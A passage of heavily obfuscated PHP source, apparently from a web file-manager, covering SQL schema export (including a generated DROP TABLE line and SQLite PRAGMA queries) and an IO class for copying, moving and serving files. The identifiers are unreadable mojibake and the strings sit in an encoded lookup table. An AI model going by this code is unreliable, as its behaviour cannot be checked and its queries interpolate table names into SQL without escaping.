$Í∂ÌŒàÄ = _get($öÎ ‡øÚ[0], $ÈíÉÍÛ·[1084], $ÈíÉÍÛ·[12]); if (!$Í∂ÌŒàÄ) { return !1; } $⁄ÿ∂ñáÏ = "\x44\x52\x4f\120\40\124\x41\102\114\x45\40\111\x46\x20\105\130\x49\123\124\x53\x20\x60{$·‰ÉÛ∆¡}\x60\x3b" . PHP_EOL . $Í∂ÌŒàÄ . $ÈíÉÍÛ·[71]; if ($î˝ÙÓäñ && $î˝ÙÓäñ == $ÈíÉÍÛ·[797]) { return $⁄ÿ∂ñáÏ; } $…»ëûÂ = array_change_key_case($GLOBALS[$ÈíÉÍÛ·[6]][$ÈíÉÍÛ·[21]]); $£û¬å‰ì = $…»ëûÂ[$ÈíÉÍÛ·[959]]; $±˚Õùä√ = $ÈíÉÍÛ·[1085] . $£û¬å‰ì . $ÈíÉÍÛ·[1086] . $·‰ÉÛ∆¡ . $ÈíÉÍÛ·[58]; $ç«íÜ®¢ = $ÈíÉÍÛ·[1087] . $·‰ÉÛ∆¡ . $ÈíÉÍÛ·[887]; $€˘›Ê≤í = $Ëﬁñ˜©±->query($±˚Õùä√); if (empty($€˘›Ê≤í)) { $íß™ñ¶Ã = array($ÈíÉÍÛ·[797] => $ÈíÉÍÛ·[12], $ÈíÉÍÛ·[13] => $ÈíÉÍÛ·[12]); return $î˝ÙÓäñ ? $íß™ñ¶Ã[$î˝ÙÓäñ] : $íß™ñ¶Ã; } $°îÊÈ˘º = $Ëﬁñ˜©±->query($ç«íÜ®¢); $ÒöﬁÁƒá = $ÈíÉÍÛ·[12]; $¸—Óà«‹ = array(); foreach ($°îÊÈ˘º as $èøÚØ¿Û) { if (!$ÒöﬁÁƒá && $èøÚØ¿Û[$ÈíÉÍÛ·[1088]] == $ÈíÉÍÛ·[1089]) { $ÒöﬁÁƒá = $èøÚØ¿Û[$ÈíÉÍÛ·[1090]]; } if (isset($¸—Óà«‹[$èøÚØ¿Û[$ÈíÉÍÛ·[1088]]])) { $¸—Óà«‹[$èøÚØ¿Û[$ÈíÉÍÛ·[1088]]][$ÈíÉÍÛ·[1091]][] = $èøÚØ¿Û[$ÈíÉÍÛ·[1090]]; continue; } $¸—Óà«‹[$èøÚØ¿Û[$ÈíÉÍÛ·[1088]]] = array($ÈíÉÍÛ·[1092] => $èøÚØ¿Û[$ÈíÉÍÛ·[1088]], $ÈíÉÍÛ·[1091] => array($èøÚØ¿Û[$ÈíÉÍÛ·[1090]]), $ÈíÉÍÛ·[1093] => $èøÚØ¿Û[$ÈíÉÍÛ·[1094]] == $ÈíÉÍÛ·[89] ? 0 : 1); } $…Âœ„Ï¢ = array(); foreach ($¸—Óà«‹ as $èøÚØ¿Û) { $æ‡¶Ùó∆ = $èøÚØ¿Û[$ÈíÉÍÛ·[1092]] == $ÈíÉÍÛ·[1089]; $Ï±¨†åˆ = array($ÈíÉÍÛ·[1095], $èøÚØ¿Û[$ÈíÉÍÛ·[1093]] == $ÈíÉÍÛ·[89] && !$æ‡¶Ùó∆ ? $ÈíÉÍÛ·[1096] : $ÈíÉÍÛ·[12], $ÈíÉÍÛ·[1097], $ÈíÉÍÛ·[1098] . $·‰ÉÛ∆¡ . $ÈíÉÍÛ·[11] . ($æ‡¶Ùó∆ ? $ÈíÉÍÛ·[1099] : $èøÚØ¿Û[$ÈíÉÍÛ·[1092]]) . $ÈíÉÍÛ·[117], $ÈíÉÍÛ·[1100], $ÈíÉÍÛ·[117] . $·‰ÉÛ∆¡ . $ÈíÉÍÛ·[117], $ÈíÉÍÛ·[1101] . implode($ÈíÉÍÛ·[1102], $èøÚØ¿Û[$ÈíÉÍÛ·[1091]]) . $ÈíÉÍÛ·[1103]); $…Âœ„Ï¢[] = implode($ÈíÉÍÛ·[53], $Ï±¨†åˆ) . $ÈíÉÍÛ·[71]; } $ÚÇàÌÁà = array(); $∏áÜ™¥ç = array($ÈíÉÍÛ·[1104] => $ÈíÉÍÛ·[1105], $ÈíÉÍÛ·[1105] => $ÈíÉÍÛ·[1105], $ÈíÉÍÛ·[283] => $ÈíÉÍÛ·[310], $ÈíÉÍÛ·[282] => $ÈíÉÍÛ·[310]); foreach ($€˘›Ê≤í as $èøÚØ¿Û) { $Ï±¨†åˆ = array($ÈíÉÍÛ·[117] . $èøÚØ¿Û[$ÈíÉÍÛ·[1106]] . $ÈíÉÍÛ·[117], isset($∏áÜ™¥ç[$èøÚØ¿Û[$ÈíÉÍÛ·[1107]]]) ? $∏áÜ™¥ç[$èøÚØ¿Û[$ÈíÉÍÛ·[1107]]] : $èøÚØ¿Û[$ÈíÉÍÛ·[1108]], $èøÚØ¿Û[$ÈíÉÍÛ·[1109]] == $ÈíÉÍÛ·[885] ? $ÈíÉÍÛ·[1110] : $ÈíÉÍÛ·[1111], $èøÚØ¿Û[$ÈíÉÍÛ·[1106]] == $ÒöﬁÁƒá ? $ÈíÉÍÛ·[1112] : $ÈíÉÍÛ·[12], $èøÚØ¿Û[$ÈíÉÍÛ·[936]] ? strtoupper(str_replace($ÈíÉÍÛ·[11], $ÈíÉÍÛ·[12], $èøÚØ¿Û[$ÈíÉÍÛ·[936]])) : $ÈíÉÍÛ·[12]); $ÚÇàÌÁà[] = trim(implode($ÈíÉÍÛ·[53], $Ï±¨†åˆ)); } $Õ≠⁄Ö◊ù = array($ÈíÉÍÛ·[1113] . $·‰ÉÛ∆¡ . $ÈíÉÍÛ·[1114], $ÈíÉÍÛ·[1115] . $·‰ÉÛ∆¡ . $ÈíÉÍÛ·[1116], implode($ÈíÉÍÛ·[50] . PHP_EOL, $ÚÇàÌÁà), $ÈíÉÍÛ·[933]); $∂ôöÑΩÆ = implode(PHP_EOL, array_merge($Õ≠⁄Ö◊ù, $…Âœ„Ï¢)); if ($î˝ÙÓäñ && $î˝ÙÓäñ == $ÈíÉÍÛ·[13]) { return $∂ôöÑΩÆ; } $íß™ñ¶Ã = array($ÈíÉÍÛ·[797] => $⁄ÿ∂ñáÏ, $ÈíÉÍÛ·[13] => $∂ôöÑΩÆ); return $î˝ÙÓäñ ? $íß™ñ¶Ã[$î˝ÙÓäñ] : $íß™ñ¶Ã; } public function sqlFromSqlite($ëîæ® ‡, $¥Ä–«ìÚ = '') { $§ÿÖ≥õ =& $_SERVER[Çâä∆◊¡]; $¡‰ÈÜ≤› = $this->model()->db(); $‚ÇÉ¯ÆŸ = "\120\x52\x41\x47\x4d\101\x20\x54\101\102\114\105\x5f\x49\x4e\x46\x4f\x20\50\x27{$ëîæ® ‡}\47\x29"; $≥Æ‹ÒÂ· = "\x53\105\x4c\105\103\x54\40\52\x20\106\122\x4f\x4d\x20\x73\x71\x6c\x69\164\x65\x5f\x6d\141\x73\x74\145\162\x20\127\110\x45\122\105\x20\164\142\x6c\137\x6e\x61\x6d\x65\40\x3d\x20\47{$ëîæ® ‡}\47"; $ˆÚÜ∞Ïÿ = $¡‰ÈÜ≤›->query($‚ÇÉ¯ÆŸ); if (empty($ˆÚÜ∞Ïÿ)) { $Çè∑õ…î = array($§ÿÖ≥õ[797] => $§ÿÖ≥õ[12], $§ÿÖ≥õ[13] => $§ÿÖ≥õ[12]); return $¥Ä–«ìÚ ? $Çè∑õ…î[$¥Ä–«ìÚ] : $Çè∑õ…î; } $ÃΩÛï≥ƒ = $¡‰ÈÜ≤›->query($≥Æ‹ÒÂ·); $ÆÚÀâÖ¿ = $Ä£∂è¬§ = array(); foreach ($ÃΩÛï≥ƒ as $È–á∏®˙) { if ($È–á∏®˙[$§ÿÖ≥õ[33]] == $§ÿÖ≥õ[274]) { $ÆÚÀâÖ¿[] = $È–á∏®˙[$§ÿÖ≥õ[1117]]; } else { $Ä£∂è¬§[$È–á∏®˙[$§ÿÖ≥õ[32]]] = $È–á∏®˙[$§ÿÖ≥õ[1117]]; } } $Õ•≈ú∞Æ = array_merge(array($§ÿÖ≥õ[1113] . $ëîæ® ‡ . $§ÿÖ≥õ[117]), $ÆÚÀâÖ¿, array_values($Ä£∂è¬§)); $Õ•≈ú∞Æ = implode($§ÿÖ≥õ[71] . PHP_EOL, $Õ•≈ú∞Æ) . $§ÿÖ≥õ[71]; if ($¥Ä–«ìÚ && $¥Ä–«ìÚ == $§ÿÖ≥õ[13]) { return $Õ•≈ú∞Æ; } $˘˘ ¥‹ñ = array(); $øÌåŒ˙Ø = array($§ÿÖ≥õ[1105] => $§ÿÖ≥õ[1118], $§ÿÖ≥õ[310] => $§ÿÖ≥õ[1119]); $ö¸Õì‹ã = $§ÿÖ≥õ[12]; foreach ($ˆÚÜ∞Ïÿ as $È–á∏®˙) { if ($È–á∏®˙[$§ÿÖ≥õ[57]] == $§ÿÖ≥õ[89]) { $ö¸Õì‹ã = $È–á∏®˙[$§ÿÖ≥õ[32]]; } $™‹ãÆìƒ = array($§ÿÖ≥õ[380] . $È–á∏®˙[$§ÿÖ≥õ[32]] . $§ÿÖ≥õ[380], isset($øÌåŒ˙Ø[$È–á∏®˙[$§ÿÖ≥õ[33]]]) ? $øÌåŒ˙Ø[$È–á∏®˙[$§ÿÖ≥õ[33]]] : $È–á∏®˙[$§ÿÖ≥õ[33]], $È–á∏®˙[$§ÿÖ≥õ[35]] == $§ÿÖ≥õ[89] ? $§ÿÖ≥õ[1110] : $§ÿÖ≥õ[1120] . $È–á∏®˙[$§ÿÖ≥õ[56]], $È–á∏®˙[$§ÿÖ≥õ[57]] == $§ÿÖ≥õ[89] ? $§ÿÖ≥õ[1121] : $§ÿÖ≥õ[12]); $˘˘ ¥‹ñ[] = trim(implode($§ÿÖ≥õ[53], $™‹ãÆìƒ)); } foreach ($Ä£∂è¬§ as $ﬁÒ‹ÒåÜ => $›ú¨ÕÖØ) { $¬ŒßÀ˛√ = str_replace($§ÿÖ≥õ[1122] . $ëîæ® ‡ . $§ÿÖ≥õ[11], $§ÿÖ≥õ[12], $ﬁÒ‹ÒåÜ); $€Ü£°â¿ = str_replace(array($§ÿÖ≥õ[117], $§ÿÖ≥õ[944]), $§ÿÖ≥õ[380], substr($›ú¨ÕÖØ, stripos($›ú¨ÕÖØ, $§ÿÖ≥õ[255]))); if ($¬ŒßÀ˛√ == $§ÿÖ≥õ[1099]) { $§ˆÇ™´ä = $§ÿÖ≥õ[1123] . $ö¸Õì‹ã . $§ÿÖ≥õ[1124]; } else { $§ˆÇ™´ä = (stripos($¬ŒßÀ˛√, $§ÿÖ≥õ[11]) ? $§ÿÖ≥õ[1125] : $§ÿÖ≥õ[12]) . ($§ÿÖ≥õ[1126] . $¬ŒßÀ˛√ . $§ÿÖ≥õ[1127] . $€Ü£°â¿); } $˘˘ ¥‹ñ[] = $§ˆÇ™´ä; } $‡ëÔú©¯ = array($§ÿÖ≥õ[1128] . $ëîæ® ‡ . $§ÿÖ≥õ[1129], $§ÿÖ≥õ[1130] . $ëîæ® ‡ . $§ÿÖ≥õ[1131], implode($§ÿÖ≥õ[50] . PHP_EOL, $˘˘ ¥‹ñ), $§ÿÖ≥õ[1132]); $ê’∑¶´∏ = implode(PHP_EOL, $‡ëÔú©¯); if ($¥Ä–«ìÚ && $¥Ä–«ìÚ == $§ÿÖ≥õ[797]) { return $ê’∑¶´∏; } $Çè∑õ…î = array($§ÿÖ≥õ[797] => $ê’∑¶´∏, $§ÿÖ≥õ[13] => $Õ•≈ú∞Æ); return $¥Ä–«ìÚ ? $Çè∑õ…î[$¥Ä–«ìÚ] : $Çè∑õ…î; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($¿≤õÄ◊î, $≠Ä±√•ı) { $Ñ∑æ–›˛ =& $_SERVER[Çâä∆◊¡]; $àêáııí = $≠Ä±√•ı; $GLOBALS[$Ñ∑æ–›˛[1133]] = $Ñ∑æ–›˛[1134] . $¿≤õÄ◊î; Hook::trigger($Ñ∑æ–›˛[1134] . $¿≤õÄ◊î . $Ñ∑æ–›˛[1135], $àêáııí); $Ó„ùÔôÑ = self::driverMake($≠Ä±√•ı[0]); if (!$Ó„ùÔôÑ) { return !1; } if (method_exists($Ó„ùÔôÑ, $¿≤õÄ◊î)) { $‘ı…‹Ë· = @call_user_func_array(array($Ó„ùÔôÑ, $¿≤õÄ◊î), $≠Ä±√•ı); } else { if (method_exists($Ó„ùÔôÑ, $Ñ∑æ–›˛[1136])) { $‘ı…‹Ë· = @call_user_func_array(array($Ó„ùÔôÑ, $¿≤õÄ◊î), $≠Ä±√•ı); } else { if (method_exists(self, $¿≤õÄ◊î)) { $‘ı…‹Ë· = @call_user_func_array(array(self, $¿≤õÄ◊î), $≠Ä±√•ı); } else { $‘ı…‹Ë· = call_user_func_array(array(parent, $¿≤õÄ◊î), $≠Ä±√•ı); } } } Hook::trigger($Ñ∑æ–›˛[1134] . $¿≤õÄ◊î . $Ñ∑æ–›˛[1137], $àêáııí, $‘ı…‹Ë·); return $‘ı…‹Ë·; } public static function init($òàΩº≤ﬂ) { return self::driverMake($òàΩº≤ﬂ); } public static function copy($ùéπﬂéï, $‚Éï˚•, $Œ∏ÕÆÂ∆ = false, $ôˆåÄ‘ª = false) { return self::copyMoveStart($ùéπﬂéï, $‚Éï˚•, $Œ∏ÕÆÂ∆, $_SERVER[Çâä∆◊¡][549], $ôˆåÄ‘ª); } public static function move($Ì™˘çœ™, $ïÿ≤∆„◊, $‰˛ê¶˜• = false, $ôÜﬂ¢Â = false) { return self::copyMoveStart($Ì™˘çœ™, $ïÿ≤∆„◊, $‰˛ê¶˜•, $_SERVER[Çâä∆◊¡][551], $ôÜﬂ¢Â); } private static function copyMoveStart($¿Ö¡Á°ª, $¶´ºÛÉø, $ºÊ¿ßüπ, $Ω¡‹ºÚä, $¸úı‹í≥) { $º‹ñ‡∞ù =& $_SERVER[Çâä∆◊¡]; $Ò÷∑µúﬂ = array($¿Ö¡Á°ª, $¶´ºÛÉø, $ºÊ¿ßüπ, $¸úı‹í≥); Hook::trigger($º‹ñ‡∞ù[1134] . $Ω¡‹ºÚä . $º‹ñ‡∞ù[1135], $Ò÷∑µúﬂ); $ÌÖ≤¶óÃ = self::copyMove($¿Ö¡Á°ª, $¶´ºÛÉø, $ºÊ¿ßüπ, $Ω¡‹ºÚä, $¸úı‹í≥); Hook::trigger($º‹ñ‡∞ù[1134] . $Ω¡‹ºÚä . $º‹ñ‡∞ù[1137], $Ò÷∑µúﬂ, $ÌÖ≤¶óÃ); return $ÌÖ≤¶óÃ; } public static function saveFile($¸£Õ¨ç¨, $™∫ÔÎø¬, $ÏÔÃ˚îﬂ = true) { $‰»≥Èòí =& $_SERVER[Çâä∆◊¡]; $›Ã‰ÔÓø = self::info($™∫ÔÎø¬); $¢çß§™´ = self::driverMake($¸£Õ¨ç¨); $–°Øõ£® = self::driverMake($™∫ÔÎø¬); $ﬁ¸¶‚ô¥ = !1; if ($–°Øõ£®->pathParse[$‰»≥Èòí[1138]]) { $ﬁ¸¶‚ô¥ = $–°Øõ£®; $ƒÛ‰”õΩ = $–°Øõ£®->pathParse[$‰»≥Èòí[1138]]; $–°Øõ£® = self::driverMake($ƒÛ‰”õΩ); } if ($¢çß§™´->pathParse[$‰»≥Èòí[1138]]) { $›Ñ∑œï∂ = $¢çß§™´->pathParse[$‰»≥Èòí[1138]]; $¢çß§™´ = self::driverMake($›Ñ∑œï∂); } $˙⁄ó•Üπ = $–°Øõ£®->pathFather($™∫ÔÎø¬); $ÎÈê≤ﬂÆ = !0; if (!$ÏÔÃ˚îﬂ && self::driverIsSame($¢çß§™´, $–°Øõ£®)) { $ÎÈê≤ﬂÆ = !1; } $®¿˚ë¸Ì = self::copyFile($¢çß§™´, $¸£Õ¨ç¨, $–°Øõ£®, $˙⁄ó•Üπ, $›Ã‰ÔÓø[$‰»≥Èòí[32]], $ÎÈê≤ﬂÆ); if ($ﬁ¸¶‚ô¥) { $®¿˚ë¸Ì = $ﬁ¸¶‚ô¥->getPathOuter($®¿˚ë¸Ì); } return $®¿˚ë¸Ì; } private static function copyMove($”†ôÆ•Ñ, $»ÌÅÙÆ†, $œÎìò¿∏, $∏ú‰´¿ª, $‡⁄ô àÅ = false) { $¢å˚Ñ©õ =& $_SERVER[Çâä∆◊¡]; if (!$”†ôÆ•Ñ || $”†ôÆ•Ñ == $¢å˚Ñ©õ[8] || !$»ÌÅÙÆ†) { return !1; } ignore_timeout(); $ì∑™‹Ì· = self::driverMake($”†ôÆ•Ñ); $¡◊ó‘˝ö = self::driverMake($»ÌÅÙÆ†); $˚ãÒï““ = $∏ú‰´¿ª == $¢å˚Ñ©õ[551]; $≤—´—íı = !1; if ($¡◊ó‘˝ö->pathParse[$¢å˚Ñ©õ[1138]]) { $≤—´—íı = $¡◊ó‘˝ö; $»ÌÅÙÆ† = $¡◊ó‘˝ö->pathParse[$¢å˚Ñ©õ[1138]]; $¡◊ó‘˝ö = self::driverMake($»ÌÅÙÆ†); } if ($ì∑™‹Ì·->pathParse[$¢å˚Ñ©õ[1138]]) { $”†ôÆ•Ñ = $ì∑™‹Ì·->pathParse[$¢å˚Ñ©õ[1138]]; $ì∑™‹Ì· = self::driverMake($”†ôÆ•Ñ); } self::check($ì∑™‹Ì·, $”†ôÆ•Ñ, $¡◊ó‘˝ö, $»ÌÅÙÆ†); Hook::trigger($¢å˚Ñ©õ[75], $ì∑™‹Ì·, $”†ôÆ•Ñ, $¡◊ó‘˝ö, $»ÌÅÙÆ†); $Å¶Õ…˛É = self::driverIsSame($ì∑™‹Ì·, $¡◊ó‘˝ö); if ($Å¶Õ…˛É) { if ($∏ú‰´¿ª == $¢å˚Ñ©õ[551] && !method_exists($¡◊ó‘˝ö, $¢å˚Ñ©õ[1139]) && trim($»ÌÅÙÆ†, $¢å˚Ñ©õ[8]) == trim($¡◊ó‘˝ö->pathFather($”†ôÆ•Ñ), $¢å˚Ñ©õ[8])) { if ($ì∑™‹Ì·->pathThis($”†ôÆ•Ñ) != $‡⁄ô àÅ && !$ì∑™‹Ì·->isTypeObject()) { return $ì∑™‹Ì·->rename($”†ôÆ•Ñ, $‡⁄ô àÅ); } return $¡◊ó‘˝ö->getPathOuter($”†ôÆ•Ñ); } if (method_exists($¡◊ó‘˝ö, $∏ú‰´¿ª)) { return $¡◊ó‘˝ö->{$∏ú‰´¿ª}($”†ôÆ•Ñ, $»ÌÅÙÆ†, $œÎìò¿∏, $‡⁄ô àÅ); } } if ($Å¶Õ…˛É && $∏ú‰´¿ª == $¢å˚Ñ©õ[551] && $¡◊ó‘˝ö->getType() == $¢å˚Ñ©õ[107]) { $πà˛ä…Œ = $¡◊ó‘˝ö->movePath($”†ôÆ•Ñ, $»ÌÅÙÆ†, $‡⁄ô àÅ); if ($πà˛ä…Œ) { return $πà˛ä…Œ; } } $ÎﬁÁ¡Û¶ = $ì∑™‹Ì·->isFile($”†ôÆ•Ñ); if (!$ÎﬁÁ¡Û¶ && $¡◊ó‘˝ö->getType() == $¢å˚Ñ©õ[751] && $ì∑™‹Ì·->getType() == $¢å˚Ñ©õ[107]) { $πà˛ä…Œ = $¡◊ó‘˝ö->copyFolderFromIO($ì∑™‹Ì·, $”†ôÆ•Ñ, $»ÌÅÙÆ†, $œÎìò¿∏, $˚ãÒï““, $‡⁄ô àÅ); } else { $πà˛ä…Œ = self::copyPath($ì∑™‹Ì·, $”†ôÆ•Ñ, $¡◊ó‘˝ö, $»ÌÅÙÆ†, $œÎìò¿∏, $˚ãÒï““, $ÎﬁÁ¡Û¶, $‡⁄ô àÅ); } if ($πà˛ä…Œ && $˚ãÒï““) { $ì∑™‹Ì·->remove($”†ôÆ•Ñ); } if ($≤—´—íı) { $πà˛ä…Œ = $≤—´—íı->getPathOuter($πà˛ä…Œ); } return $πà˛ä…Œ; } private static function check($Ó»å‰√–, $ÌÑâ≈ã≈, $π¢å∆ ±, &$Ä∆≤Ê∑ƒ) { $È‹ÜΩÊ‘ =& $_SERVER[Çâä∆◊¡]; if (self::driverIsSame($Ó»å‰√–, $π¢å∆ ±) && $Ó»å‰√–->isFolder($ÌÑâ≈ã≈) && $Ó»å‰√–->isParentOf($ÌÑâ≈ã≈, $Ä∆≤Ê∑ƒ)) { show_json(LNG($È‹ÜΩÊ‘[1140]), !1); } if (!$Ó»å‰√–->exist($ÌÑâ≈ã≈)) { show_json(LNG($È‹ÜΩÊ‘[106]), !1); } } private static function copyPath($≥åòπê‚, $ ÚÉ¯…§, $≈Ëüòı≠, $Ù”£—ä∫, $»ˆ≠ß¯ö, $È‘¿Åùê, $–÷õÕ∞“, $ºàôˆûé = false) { $÷Éœó∂™ =& $_SERVER[Çâä∆◊¡]; $≠ÖË∏â˚ = empty($ºàôˆûé) && $ºàôˆûé !== $÷Éœó∂™[190] ? $≥åòπê‚->pathThis($ ÚÉ¯…§) : $ºàôˆûé; if ($»ˆ≠ß¯ö) { $«Ò•¯î© = $≈Ëüòı≠->fileNameExist($Ù”£—ä∫, $≠ÖË∏â˚); $≠ÖË∏â˚ = $≈Ëüòı≠->fileNameAuto($Ù”£—ä∫, $≠ÖË∏â˚, $»ˆ≠ß¯ö, !$–÷õÕ∞“); $»ˆ≠ß¯ö = $«Ò•¯î© ? $»ˆ≠ß¯ö : !1; } if ($–÷õÕ∞“) { return self::copyFile($≥åòπê‚, $ ÚÉ¯…§, $≈Ëüòı≠, $Ù”£—ä∫, $≠ÖË∏â˚, $È‘¿Åùê); } if ($»ˆ≠ß¯ö == REPEAT_RENAME_FOLDER) { $»ˆ≠ß¯ö = !1; } $ﬂ¿Ù™çﬂ = rtrim($Ù”£—ä∫, $÷Éœó∂™[8]) . $÷Éœó∂™[8] . $≠ÖË∏â˚; $ÓÉ¿‘∂ã = $≈Ëüòı≠->mkdir($≈Ëüòı≠->getPath($ﬂ¿Ù™çﬂ)); $Ù”£—ä∫ = $≈Ëüòı≠->getPathInner($ÓÉ¿‘∂ã); $êªµìä = $≥åòπê‚->listPath($ ÚÉ¯…§, !0); $êªµìä = is_array($êªµìä) ? $êªµìä : array($÷Éœó∂™[76] => array(), $÷Éœó∂™[77] => array()); $◊˝«Ñò¢ = array_merge($êªµìä[$÷Éœó∂™[76]], $êªµìä[$÷Éœó∂™[77]]); foreach ($◊˝«Ñò¢ as $ÓÌ«ƒ£è) { $¨úå∂Ì“ = $ÓÌ«ƒ£è[$÷Éœó∂™[33]] == $÷Éœó∂™[192]; $ ÚÉ¯…§ = $≥åòπê‚->getPathInner($ÓÌ«ƒ£è[$÷Éœó∂™[78]]); $˝ÍÊﬂÂ = self::copyPath($≥åòπê‚, $ ÚÉ¯…§, $≈Ëüòı≠, $Ù”£—ä∫, $»ˆ≠ß¯ö, $È‘¿Åùê, $¨úå∂Ì“); if (!$˝ÍÊﬂÂ) { IO::errorTips($÷Éœó∂™[1141] . $ ÚÉ¯…§ . $÷Éœó∂™[70] . $Ù”£—ä∫); } } self::copyMoveKeepInfo($≥åòπê‚, $ ÚÉ¯…§, $ÓÉ¿‘∂ã); return $ÓÉ¿‘∂ã; } private static function copyFile($Â·™”˝‹, $§≠€ôº¶, $¬ŒíÁÔÅ, $ÙπìÖà˘, $ÙÇª·‹Ö, $å‡éúÿÃ) { $Ï´∫ê£È =& $_SERVER[Çâä∆◊¡]; $ÙπìÖà˘ = $¬ŒíÁÔÅ->getPath(rtrim($ÙπìÖà˘, $Ï´∫ê£È[8]) . $Ï´∫ê£È[8] . $ÙÇª·‹Ö); $∞ΩåÂ”û = $Ï´∫ê£È[1142] . time() . rand_string(5); Hook::trigger($Ï´∫ê£È[1143], $Â·™”˝‹, $§≠€ôº¶, $¬ŒíÁÔÅ, $ÙπìÖà˘, $ÙÇª·‹Ö, $∞ΩåÂ”û); if (self::driverIsSame($Â·™”˝‹, $¬ŒíÁÔÅ)) { if ($å‡éúÿÃ) { $àî †Ò¢ = $¬ŒíÁÔÅ->moveFile($§≠€ôº¶, $ÙπìÖà˘); } else { $àî †Ò¢ = $¬ŒíÁÔÅ->copyFile($§≠€ôº¶, $ÙπìÖà˘); } Hook::trigger($Ï´∫ê£È[1144], $Â·™”˝‹, $§≠€ôº¶, $¬ŒíÁÔÅ, $ÙπìÖà˘, $ÙÇª·‹Ö, $àî †Ò¢); self::copyMoveKeepInfo($Â·™”˝‹, $§≠€ôº¶, $àî †Ò¢); return $àî †Ò¢; } $€Ê€íﬁÿ = TEMP_FILES; if ($GLOBALS[$Ï´∫ê£È[6]][$Ï´∫ê£È[90]][$Ï´∫ê£È[789]]) { $€Ê€íﬁÿ = $GLOBALS[$Ï´∫ê£È[6]][$Ï´∫ê£È[90]][$Ï´∫ê£È[789]]; } $îæ˜â–» = $€Ê€íﬁÿ; mk_dir($îæ˜â–»); $±÷‡¸æé = $îæ˜â–» . $∞ΩåÂ”û; $…Ù∂ﬂÔ⁄ = $±÷‡¸æé; $±÷‡¸æé = $Â·™”˝‹->download($§≠€ôº¶, $±÷‡¸æé); $±÷‡¸æé = $Â·™”˝‹->iconvApp($±÷‡¸æé); if (substr($±÷‡¸æé, strlen($€Ê€íﬁÿ)) == $€Ê€íﬁÿ) { $å‡éúÿÃ = !0; } $àî †Ò¢ = $¬ŒíÁÔÅ->upload($ÙπìÖà˘, $±÷‡¸æé, $å‡éúÿÃ); self::remove($…Ù∂ﬂÔ⁄); Hook::trigger($Ï´∫ê£È[1144], $Â·™”˝‹, $§≠€ôº¶, $¬ŒíÁÔÅ, $ÙπìÖà˘, $ÙÇª·‹Ö, $àî †Ò¢); self::copyMoveKeepInfo($Â·™”˝‹, $§≠€ôº¶, $àî †Ò¢); return $àî †Ò¢; } private static function copyMoveKeepInfo($ﬂîïî•Ú, $Âó’√¬ü, $√∞õ¯¸´) { if (!$√∞õ¯¸´) { return; } $Òóß˝ÙÑ = $ﬂîïî•Ú->info($Âó’√¬ü); if (!is_array($Òóß˝ÙÑ)) { return; } IO::setModifyTime($√∞õ¯¸´, $Òóß˝ÙÑ[$_SERVER[Çâä∆◊¡][86]]); } public static function pathFather($◊÷ºñÃÒ) { $…◊°î∂’ = IO::init($◊÷ºñÃÒ); $—¥¯ŸôÉ = $…◊°î∂’->pathFather($…◊°î∂’->path); return $…◊°î∂’->getPathOuter($—¥¯ŸôÉ); } public static function fileOut($€œ·á”Û, $è®Ô‡õ = false, $®Êé§“Ò = false, $™ë˛ıú£ = '') { $¸»Â¨Óå = self::driverMake($€œ·á”Û); if ($¸»Â¨Óå->isFileOutServer()) { return $¸»Â¨Óå->fileOutServer($€œ·á”Û, $è®Ô‡õ, $®Êé§“Ò, $™ë˛ıú£); } return $¸»Â¨Óå->fileOut($€œ·á”Û, $è®Ô‡õ, $®Êé§“Ò, $™ë˛ıú£); } public static function fileOutImage($ı“≤“¶™, $›∏Ìöπê = 250) { $»◊ØñÚ« = array(250, 600, 1200, 2000, 3000, 5000); for ($‘è›ÅÙ« = 0; $‘è›ÅÙ« < count($»◊ØñÚ«); $‘è›ÅÙ«++) { if ($‘è›ÅÙ« == 0 && $›∏Ìöπê <= $»◊ØñÚ«[$‘è›ÅÙ«]) { $›∏Ìöπê = $»◊ØñÚ«[$‘è›ÅÙ«]; break; } else { if ($›∏Ìöπê > $»◊ØñÚ«[$‘è›ÅÙ« - 1] && $›∏Ìöπê <= $»◊ØñÚ«[$‘è›ÅÙ«]) { $›∏Ìöπê = $»◊ØñÚ«[$‘è›ÅÙ«]; break; } else { if ($‘è›ÅÙ« == count($»◊ØñÚ«) - 1 && $›∏Ìöπê > $»◊ØñÚ«[$‘è›ÅÙ«]) { $›∏Ìöπê = $»◊ØñÚ«[$‘è›ÅÙ«]; break; } } } } $õÙ⁄ë–Å = self::driverMake($ı“≤“¶™); if ($õÙ⁄ë–Å->isFileOutServer()) { return $õÙ⁄ë–Å->fileOutImageServer($ı“≤“¶™, $›∏Ìöπê); } return $õÙ⁄ë–Å->fileOutImage($ı“≤“¶™, $›∏Ìöπê); } private static function driverIsSame($Êºû‚ﬁø, $≈ºÎÛŒ∫) { $™•›˙í˘ =& $_SERVER[Çâä∆◊¡]; $í∞ÇÍÔÕ = $Êºû‚ﬁø->getType(); $•ß¨ŸÔ˝ = $≈ºÎÛŒ∫->getType(); if ($í∞ÇÍÔÕ != $•ß¨ŸÔ˝) { return !1; } if ($í∞ÇÍÔÕ == $™•›˙í˘[751]) { return !0; } if ($í∞ÇÍÔÕ == $™•›˙í˘[107]) { return !0; } if ($Êºû‚ﬁø->pathDriver == $≈ºÎÛŒ∫->pathDriver) { return !0; } return !1; } public static function copyUpdate($ŸäÒπæ«, $˚±‚å”Ò) { $€ß–å÷ =& $_SERVER[Çâä∆◊¡]; if (!IO::exist($ŸäÒπæ«)) { return !1; } if (!IO::exist($˚±‚å”Ò)) { IO::mkdir($˚±‚å”Ò); } $Øıº•è¥ = self::_listAll($ŸäÒπæ«); $ﬂÎîúú˙ = self::_listAll($˚±‚å”Ò); $¯ùµ∂≈á = array(); $Ã‘⁄ÿ™æ = array(); foreach ($Øıº•è¥ as $Ë¥ñØﬁ => $îÜî‹ÓŒ) { if (isset($ﬂÎîúú˙[$Ë¥ñØﬁ])) { if ($îÜî‹ÓŒ[$€ß–å÷[79]] == 1) { continue; } if ($ﬂÎîúú˙[$Ë¥ñØﬁ][$€ß–å÷[80]] == $îÜî‹ÓŒ[$€ß–å÷[80]]) { continue; } } if ($îÜî‹ÓŒ[$€ß–å÷[79]] == 1) { $Ã‘⁄ÿ™æ[] = $˚±‚å”Ò . $€ß–å÷[8] . $Ë¥ñØﬁ; continue; } $≠≈ääÜä = strstr(trim($Ë¥ñØﬁ, $€ß–å÷[8]), $€ß–å÷[8]) ? get_path_father($Ë¥ñØﬁ) : $€ß–å÷[12]; $¯ùµ∂≈á[] = array($€ß–å÷[1145] => $îÜî‹ÓŒ[$€ß–å÷[78]], $€ß–å÷[1146] 